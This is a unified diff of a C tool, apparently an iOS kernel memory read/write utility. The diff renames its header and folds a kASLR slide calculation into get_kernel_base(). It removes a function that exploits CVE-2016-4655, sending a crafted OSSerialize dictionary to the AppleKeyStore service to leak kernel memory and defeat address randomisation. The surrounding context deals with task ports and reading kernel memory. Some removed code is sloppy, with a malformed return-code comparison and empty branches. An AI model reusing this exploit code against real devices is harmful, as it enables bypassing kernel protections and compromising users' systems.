@@ -1,6 +1,5 @@
-//vm_write by @tomitokics
-// 2019-01-08
-
+// vm_read-write by @tomitokics
+//  Created by Tomi Tokics on 2019. 01. 08.
 
 
 /*
@@ -83,6 +82,7 @@ enum {
 
 unsigned int get_kernel_base(){
     
+    //CVE 2016-4655
     
     
     unsigned int base = 0;
@@ -179,144 +179,14 @@ unsigned int get_kernel_base(){
     
     
     
-    return base;
+    return base - 0x80001000;
     
     
 }
 
 
 
-unsigned int get_kernel_slide(){
-    
-    //CVE 2016-4655
-    
-    
-    
-    
-    unsigned int kbase = get_kernel_base();
-    unsigned int kslide = 0;
-    
-    
-    
-    
-    uint32_t dict[] = {
-        0x000000d3,
-        kOSSerializeEndCollection | kOSSerializeDictionary | 2,
-        kOSSerializeSymbol | 4,
-        0x00414141,
-        kOSSerializeEndCollection | kOSSerializeNumber | 0x200,
-        0x41414141,
-        0x41414141
-        
-        
-        
-        
-    };
-    
-    
-    size_t idx = sizeof(dict);
-    
-    io_service_t serv = 0;
-    io_connect_t conn = 0;
-    io_iterator_t iter = 0;
-    
-    mach_port_t master = MACH_PORT_NULL, res = MACH_PORT_NULL;
-    
-    kern_return_t kr = 0, err = 0;
-    
-    
-    
-    
-    host_get_io_master_port(mach_host_self(), &master);
-    
-   
-    
-    
-    
-    
-    
-    if (kr == io_service_get_matching_services_bin(master,(char*)dict,idx,&res) != KERN_SUCCESS){
-        
-    }else {
-        
-        
-    }
-    
-    
-    serv = IOServiceGetMatchingService(master,IOServiceMatching("AppleKeyStore"));
-    
-    kr = io_service_open_extended(serv,mach_task_self(),0,NDR_record,(io_buf_ptr_t)dict,idx,&err,&conn);
-    
-    if (kr == KERN_SUCCESS){
-       
-        
-        
-    }else{
-        
-               
-       
-    }
-    
-    IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &iter);
-    
-    
-    io_object_t object = 0;
-    
-    uint32_t bytes = 0;
-    char buf[0x200] = {0};
-    
-    while (bytes == 0){
-        
-        if (object){
-            
-            IOObjectRelease(object);
-           
-            
-        }
-        
-        object = IOIteratorNext(iter);
-        
-        mach_msg_type_number_t bufCnt = 0x200;
-        
-        kr = io_registry_entry_get_property_bytes(object,(char*)"AAA",(char*)&buf,&bufCnt);
-        
-        
-        bytes = *(uint32_t*)(buf);
-        
-    }
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    for (int a = 0; a < 128; a += 4){
-        
-        
-        
-        
-        
-        
-    }
-    
-    
 
-    
-    
-    
-    
-    
-    
-    kslide = kbase - 0x80001000;
-    
-    
-    
-    return kslide;
-}
 
 
 int get_task_port(){
@@ -381,7 +251,7 @@ void read_test(int task, unsigned int kslide, unsigned int address,size_t size){
     for(int i = 0; i < size; i+=8){
         
         
-        printf("0x%.08x: %.02x%.02x%.02x%.02x %.02x%.02x%.02x%.02x\n\n",address+i,buffer[a],buffer[a+1],buffer[a+2],buffer[a+3],buffer[a+4],buffer[a+5],buffer[a+6],buffer[a+7]);    //thanks @bellis100
+        printf("0x%.08x: %.02x%.02x%.02x%.02x %.02x%.02x%.02x%.02x\n\n",address+i,buffer[a],buffer[a+1],buffer[a+2],buffer[a+3],buffer[a+4],buffer[a+5],buffer[a+6],buffer[a+7]);  //@bellis1000
         a+=8;
         
     }
@@ -394,7 +264,7 @@ void read_test(int task, unsigned int kslide, unsigned int address,size_t size){
 int main(){
     
     
-    unsigned int kslide = get_kernel_slide();
+    unsigned int kslide = get_kernel_base();
     
     printf("vm_read-write by @tomitokics!\n\nUse \"help\" for help\n\n");
     printf("kASLR slide: %#x\n\n",kslide);
